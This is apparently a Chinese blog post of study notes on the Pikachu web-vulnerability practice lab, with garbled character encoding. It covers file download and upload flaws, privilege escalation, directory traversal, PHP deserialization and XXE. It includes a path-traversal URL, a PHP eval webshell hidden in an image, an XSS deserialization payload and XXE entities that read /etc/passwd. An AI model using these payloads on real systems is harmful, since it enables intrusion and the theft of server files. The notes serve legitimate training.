<h1 id="ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½"><a href="#ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½"></a>ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½</h1><p><strong>ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¦‚è¿°</strong> æ–‡ä»¶ä¸‹è½½åŠŸèƒ½åœ¨å¾ˆå¤šwebç³»ç»Ÿä¸Šéƒ½ä¼šå‡ºç°ï¼Œä¸€èˆ¬æˆ‘ä»¬å½“ç‚¹å‡»ä¸‹è½½é“¾æ¥ï¼Œä¾¿ä¼šå‘åå°å‘é€ä¸€ä¸ªä¸‹è½½è¯·æ±‚ï¼Œä¸€èˆ¬è¿™ä¸ªè¯·æ±‚ä¼šåŒ…å«ä¸€ä¸ªéœ€è¦ä¸‹è½½çš„æ–‡ä»¶åç§°ï¼Œåå°åœ¨æ”¶åˆ°è¯·æ±‚åä¼šå¼€å§‹æ‰§è¡Œä¸‹è½½ä»£ç ï¼Œå°†è¯¥æ–‡ä»¶åå¯¹åº”çš„æ–‡ä»¶responseç»™æµè§ˆå™¨ï¼Œä»è€Œå®Œæˆä¸‹è½½ã€‚å¦‚æœåå°åœ¨æ”¶åˆ°è¯·æ±‚çš„æ–‡ä»¶åå,å°†å…¶ç›´æ¥æ‹¼è¿›ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ä¸­è€Œä¸å¯¹å…¶è¿›è¡Œå®‰å…¨åˆ¤æ–­çš„è¯ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚ æ­¤æ—¶å¦‚æœ æ”»å‡»è€…æäº¤çš„ä¸æ˜¯ä¸€ä¸ªç¨‹åºé¢„æœŸçš„çš„æ–‡ä»¶åï¼Œè€Œæ˜¯ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è·¯å¾„(æ¯”å¦‚..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd),åˆ™å¾ˆæœ‰å¯èƒ½ä¼šç›´æ¥å°†è¯¥æŒ‡å®šçš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œä»è€Œå¯¼è‡´åå°æ•æ„Ÿä¿¡æ¯(å¯†ç æ–‡ä»¶ã€æºä»£ç ç­‰)è¢«ä¸‹è½½ã€‚</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ä¸‹è½½æ ¹ç›®å½•ä¸‹çš„txtæ–‡ä»¶ï¼š</span><br><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../test.php</span><br></pre></td></tr></table></figure>

<h1 id="ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ "><a href="#ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ "></a>ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ </h1><blockquote>
<p>1.å®¢æœç«¯æ£€æŸ¥ï¼šæ³•ä¸€:burp suiteæ›´æ”¹ï¼›æ³•äºŒ:å‰ç«¯ç¦ç”¨js(ç«ç‹æµè§ˆå™¨-about:configç¦ç”¨js)ï¼›æ³•ä¸‰:åˆ é™¤jsä»£ç </p>
<p>2.æœåŠ¡ç«¯æ£€æŸ¥ï¼šContent-Type: image&#x2F;png or image&#x2F;jpegï¼ˆå®ç°æœåŠ¡ç«¯æ¬ºéª—ï¼‰</p>
</blockquote>
<p> 3.getimagesize()é…åˆæ–‡ä»¶åŒ…å«æ¼æ´<br>   åˆ¶ä½œå›¾ç‰‡æœ¨é©¬:</p>
<pre><code>           copy/b te.JPG+test.php cc.png
   
           test.php:&lt;?php @eval($_POST[hacker]);?&gt;
</code></pre>
<p>  ..&#x2F;..&#x2F;unsafeupload&#x2F;uploads&#x2F;2021&#x2F;08&#x2F;17&#x2F;700269611b6bffd8996945825253.png(è®¿é—®æ­¤å›¾ç‰‡æ‰§è¡ŒPHPä»£ç )</p>
<h1 id="æ°´å¹³è¶Šæƒ-amp-amp-å‚ç›´è¶Šæƒ"><a href="#æ°´å¹³è¶Šæƒ-amp-amp-å‚ç›´è¶Šæƒ" class="headerlink" title="æ°´å¹³è¶Šæƒ&amp;&amp;å‚ç›´è¶Šæƒ"></a>æ°´å¹³è¶Šæƒ&amp;&amp;å‚ç›´è¶Šæƒ</h1><blockquote>
<p><strong>å¦‚æœä½¿ç”¨Aç”¨æˆ·çš„æƒé™å»æ“ä½œBç”¨æˆ·çš„æ•°æ®ï¼ŒAçš„æƒé™å°äºBçš„æƒé™ï¼Œå¦‚æœèƒ½å¤ŸæˆåŠŸæ“ä½œï¼Œåˆ™ç§°ä¹‹ä¸ºè¶Šæƒæ“ä½œã€‚</strong> è¶Šæƒæ¼æ´å½¢æˆçš„åŸå› æ˜¯åå°ä½¿ç”¨äº† ä¸åˆç†çš„æƒé™æ ¡éªŒè§„åˆ™å¯¼è‡´çš„ã€‚<br>        ä¸€èˆ¬è¶Šæƒæ¼æ´å®¹æ˜“å‡ºç°åœ¨æƒé™é¡µé¢ï¼ˆéœ€è¦ç™»å½•çš„é¡µé¢ï¼‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·å¯¹æƒé™é¡µé¢å†…çš„ä¿¡æ¯è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œåå°éœ€è¦å¯¹å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œçœ‹å…¶æ˜¯å¦å…·å¤‡æ“ä½œçš„æƒé™ï¼Œä»è€Œç»™å‡ºå“åº”ï¼Œè€Œå¦‚æœæ ¡éªŒçš„è§„åˆ™è¿‡äºç®€å•åˆ™å®¹æ˜“å‡ºç°è¶Šæƒæ¼æ´ã€‚            </p>
</blockquote>
<blockquote>
<p>æ°´å¹³è¶Šæƒï¼šåŒçº§ç”¨æˆ·ä¹‹é—´æ“ä½œï¼Œæ›´æ”¹å¦ä¸€æ–¹çš„æ•°æ®.<br>å‚ç›´è¶Šæƒ:æƒé™ä¸åŒçš„ç”¨æˆ·ï¼Œä½æƒé™ç”¨æˆ·è·å¾—é«˜çº§ç”¨æˆ·çš„æƒé™ã€‚ç®€è€Œè¨€ä¹‹å°±æ˜¯â€“ç®¡ç†å‘˜åˆ›å»ºç”¨æˆ·çš„æ•°æ®ï¼ˆburp suiteæŠ“åŒ…ï¼‰+æ™®é€šç”¨æˆ·çš„cookie &#x3D; æ™®é€šç”¨æˆ·å®ç°ç®¡ç†å‘˜åŠŸèƒ½</p>
</blockquote>
<h1 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h1><blockquote>
<p>pikachuä¸­å…³äºç›®å½•éå†å®šä¹‰ï¼š<br>    ç›®å½•éå†æ¼æ´æ¦‚è¿°<br> åœ¨webåŠŸèƒ½è®¾è®¡ä¸­,å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¼šè¦å°†éœ€è¦è®¿é—®çš„æ–‡ä»¶å®šä¹‰æˆå˜é‡ï¼Œä»è€Œè®©å‰ç«¯çš„åŠŸèƒ½ä¾¿çš„æ›´åŠ çµæ´»ã€‚ å½“ç”¨æˆ·å‘èµ·ä¸€ä¸ªå‰ç«¯çš„è¯·æ±‚æ—¶ï¼Œä¾¿ä¼šå°†è¯·æ±‚çš„è¿™ä¸ªæ–‡ä»¶çš„å€¼(æ¯”å¦‚æ–‡ä»¶åç§°)ä¼ é€’åˆ°åå°ï¼Œåå°å†æ‰§è¡Œå…¶å¯¹åº”çš„æ–‡ä»¶ã€‚ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœåå°æ²¡æœ‰å¯¹å‰ç«¯ä¼ è¿›æ¥çš„å€¼è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡â€œ..&#x2F;â€è¿™æ ·çš„æ‰‹æ®µè®©åå°æ‰“å¼€æˆ–è€…æ‰§è¡Œä¸€äº›å…¶ä»–çš„æ–‡ä»¶ã€‚ ä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨ä¸Šå…¶ä»–ç›®å½•çš„æ–‡ä»¶ç»“æœè¢«éå†å‡ºæ¥ï¼Œå½¢æˆç›®å½•éå†æ¼æ´ã€‚<br> çœ‹åˆ°è¿™é‡Œ,ä½ å¯èƒ½ä¼šè§‰å¾—ç›®å½•éå†æ¼æ´å’Œä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½ï¼Œç”šè‡³æ–‡ä»¶åŒ…å«æ¼æ´æœ‰å·®ä¸å¤šçš„æ„æ€ï¼Œæ˜¯çš„ï¼Œç›®å½•éå†æ¼æ´å½¢æˆçš„æœ€ä¸»è¦çš„åŸå› è·Ÿè¿™ä¸¤è€…ä¸€æ ·ï¼Œéƒ½æ˜¯åœ¨åŠŸèƒ½è®¾è®¡ä¸­å°†è¦æ“ä½œçš„æ–‡ä»¶ä½¿ç”¨å˜é‡çš„ æ–¹å¼ä¼ é€’ç»™äº†åå°ï¼Œè€Œåˆæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘è€Œé€ æˆçš„ï¼Œåªæ˜¯å‡ºç°çš„ä½ç½®æ‰€å±•ç°çš„ç°è±¡ä¸ä¸€æ ·ï¼Œå› æ­¤ï¼Œè¿™é‡Œè¿˜æ˜¯å•ç‹¬æ‹¿å‡ºæ¥å®šä¹‰ä¸€ä¸‹ã€‚<br> éœ€è¦åŒºåˆ†ä¸€ä¸‹çš„æ˜¯,å¦‚æœä½ é€šè¿‡ä¸å¸¦å‚æ•°çš„urlï¼ˆæ¯”å¦‚ï¼š<a href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82">http://xxxx/docï¼‰åˆ—å‡ºäº†docæ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ï¼Œè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</a> è€Œå¹¶ä¸å½’ä¸ºç›®å½•éå†æ¼æ´ã€‚ï¼ˆå…³äºæ•æ„Ÿä¿¡æ¯æ³„éœ²ä½ ä½ å¯ä»¥åœ¨â€i can see you ABCâ€ä¸­äº†è§£æ›´å¤šï¼‰ </p>
</blockquote>
<h1 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h1><blockquote>
<p>æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¦‚è¿°<br> ç”±äºåå°äººå‘˜çš„ç–å¿½æˆ–è€…ä¸å½“çš„è®¾è®¡ï¼Œå¯¼è‡´ä¸åº”è¯¥è¢«å‰ç«¯ç”¨æˆ·çœ‹åˆ°çš„æ•°æ®è¢«è½»æ˜“çš„è®¿é—®åˆ°ã€‚ æ¯”å¦‚ï¼š<br> â€”é€šè¿‡è®¿é—®urlä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨;<br> â€”è¾“å…¥é”™è¯¯çš„urlå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯;<br> â€”å‰ç«¯çš„æºç ï¼ˆhtml,css,jsï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰;<br> ç±»ä¼¼ä»¥ä¸Šè¿™äº›æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚æ•æ„Ÿä¿¡æ¯æ³„éœ²è™½ç„¶ä¸€ç›´è¢«è¯„ä¸ºå±å®³æ¯”è¾ƒä½çš„æ¼æ´ï¼Œä½†è¿™äº›æ•æ„Ÿä¿¡æ¯å¾€å¾€ç»™æ”»å‡»ç€å®æ–½è¿›ä¸€æ­¥çš„æ”»å‡»æä¾›å¾ˆå¤§çš„å¸®åŠ©,ç”šè‡³â€œç¦»è°±â€çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²ä¹Ÿä¼šç›´æ¥é€ æˆä¸¥é‡çš„æŸå¤±ã€‚ å› æ­¤,åœ¨webåº”ç”¨çš„å¼€å‘ä¸Šï¼Œé™¤äº†è¦è¿›è¡Œå®‰å…¨çš„ä»£ç ç¼–å†™ï¼Œä¹Ÿéœ€è¦æ³¨æ„å¯¹æ•æ„Ÿä¿¡æ¯çš„åˆç†å¤„ç†ã€‚ </p>
</blockquote>
<h1 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h1><p>æ¼æ´äº§ç”ŸåŸå› ï¼š PHP ååºåˆ—åŒ–æ¼æ´åˆå«åš PHP å¯¹è±¡æ³¨å…¥æ¼æ´ï¼Œæ˜¯å› ä¸ºç¨‹åºå¯¹è¾“å…¥æ•°æ®å¤„ç†ä¸å½“å¯¼è‡´çš„. ååºåˆ—åŒ–æ¼æ´çš„æˆ å› åœ¨äºä»£ç ä¸­çš„ unserialize() æ¥æ”¶çš„å‚æ•°å¯æ§ï¼Œä»ä¸Šé¢çš„ä¾‹å­çœ‹ï¼Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ï¼Œ è€Œåºåˆ—åŒ–çš„å¯¹è±¡åªå«æœ‰å¯¹è±¡çš„å±æ€§ï¼Œé‚£æˆ‘ä»¬å°±è¦åˆ©ç”¨å¯¹å¯¹è±¡å±æ€§çš„ç¯¡æ”¹å®ç°æœ€ç»ˆçš„æ”»å‡»ã€‚ <em>æ€»è€Œè¨€ä¹‹ï¼š</em> <strong>ååºåˆ—åŒ–æ¼æ´æ˜¯ç”±äºunserializeå‡½æ•°æ¥æ”¶åˆ°äº†æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ç¯¡æ”¹æˆå‘˜å±æ€§åå¯¼è‡´çš„ã€‚</strong></p>
<blockquote>
<p>æ·±å…¥ç†è§£æ¼æ´: <a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>
<p>å…³äºå‡½æ•°é­”æœ¯æ–¹æ³• <a href="https://zhuanlan.zhihu.com/p/377676274">https://zhuanlan.zhihu.com/p/377676274</a> ç†è§£PHPååºåˆ—åŒ–æ¼æ´</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">åºåˆ—åŒ–</span><br><span class="line">æœ‰ç±»:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//æŠŠè¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line"><span class="meta">?&gt;</span>	</span><br><span class="line"><span class="comment">//è¾“å‡ºï¼šO:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span></span><br><span class="line"><span class="comment">//è¯´æ˜ï¼š O:ä»£è¡¨object	1:ä»£è¡¨å¯¹è±¡åå­—é•¿åº¦ä¸ºä¸€ä¸ªå­—ç¬¦		S:å¯¹è±¡çš„åç§°</span></span><br><span class="line"><span class="comment">//      1:ä»£è¡¨å¯¹è±¡é‡Œé¢æœ‰ä¸€ä¸ªå˜é‡	s:æ•°æ®ç±»å‹		4:å˜é‡åç§°çš„é•¿åº¦</span></span><br><span class="line"><span class="comment">//      test:å˜é‡åç§°	s:æ•°æ®ç±»å‹	 7:å˜é‡å€¼çš„é•¿åº¦	pikachu:å˜é‡å€¼</span></span><br><span class="line"></span><br><span class="line">æ— ç±»ï¼š</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$t</span> = <span class="string">&#x27;xiaodi&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="meta">?&gt;</span>      </span><br><span class="line"><span class="comment">//è¾“å‡ºï¼šs:6:&quot;xiaodi&quot;;  </span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ååºåˆ—åŒ–</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//æŠŠè¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$u</span>=<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test; <span class="comment">//å¾—åˆ°çš„ç»“æœä¸ºpikachu</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//è¾“å‡ºï¼šO:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span></span><br><span class="line"><span class="comment">//		pikachu	</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">é­”æœ¯æ–¹æ³•ï¼š</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">         <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">         <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     /<span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">     @<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:8:&quot;pikachua&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span>	</span><br><span class="line"><span class="comment">//è¾“å‡ºï¼špikachua</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å¸¸è§é­”æœ¯æ–¹æ³•ï¼š</span></span><br><span class="line"><span class="comment">	__construct()ï¼Œç±»çš„æ„é€ å‡½æ•°	__destruct()ï¼Œç±»çš„ææ„å‡½æ•°</span></span><br><span class="line"><span class="comment">	__call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span></span><br><span class="line"><span class="comment">	__callStatic()ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span></span><br><span class="line"><span class="comment">	__get()ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨		__set()ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span></span><br><span class="line"><span class="comment">	__isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨</span></span><br><span class="line"><span class="comment">	__unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚</span></span><br><span class="line"><span class="comment">	__sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span></span><br><span class="line"><span class="comment">	__wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span></span><br><span class="line"><span class="comment">	__toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</span></span><br><span class="line"><span class="comment">	__invoke()ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</span></span><br><span class="line"><span class="comment">	__set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</span></span><br><span class="line"><span class="comment">	__clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨		__autoload()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span></span><br><span class="line"><span class="comment">	__debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line"><span class="comment">	//PHPè®²ä»¥åŒä¸‹åˆ’çº¿__ä¿ç•™ä¸ºé­”æœ¯æ–¹æ³•ï¼Œæ‰€æœ‰çš„é­”æœ¯æ–¹æ³• å¿…é¡» å£°æ˜ä¸º publicã€‚</span></span><br><span class="line"><span class="comment">	//è¯¦è§£ï¼›https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pikachuæºç ï¼š</span><br><span class="line"></span><br><span class="line">pikachu:</span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//æŠŠè¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line">   </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ©ç”¨ï¼š</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">O</span>:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;<span class="attr">s</span>:<span class="number">25</span>:<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="XXEæ¼æ´"><a href="#XXEæ¼æ´" class="headerlink" title="XXEæ¼æ´"></a>XXEæ¼æ´</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">å‚è€ƒé“¾æ¥:https://article.itxueyuan.com/nW74BB</span><br><span class="line">xml:ä¼ è¾“å’Œå­˜å‚¨æ•°æ®æ ¼å¼ç±»å‹,ä¼ è¾“æ•°æ®</span><br><span class="line">XXE:æŒ‡&quot;xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´&quot;ï¼Œå³xmlä¸Šçš„æ¼æ´ã€‚æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯&quot;æ”»å‡»è€…é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹,ä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜&quot;ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯æ¥æ”¶å’Œè§£æäº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚</span><br><span class="line">å±å®³:æ–‡ä»¶è¯»å–,RCEåˆ©ç”¨,å†…ç½‘æ”»å‡»,DOSæ”»å‡»</span><br><span class="line"></span><br><span class="line">æ˜¾ç¤ºå†…å®¹:</span><br><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;å­˜åœ¨XXEæ¼æ´&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">è¯»å–å†…å®¹:</span><br><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///G://wshy.txt&quot;</span>&gt;</span>    </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">===============================================</span><br><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:////etc/passwd&quot;</span>&gt;</span>    </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">================================================</span><br><span class="line">å¼•å…¥å¤–éƒ¨å®ä½“:</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span 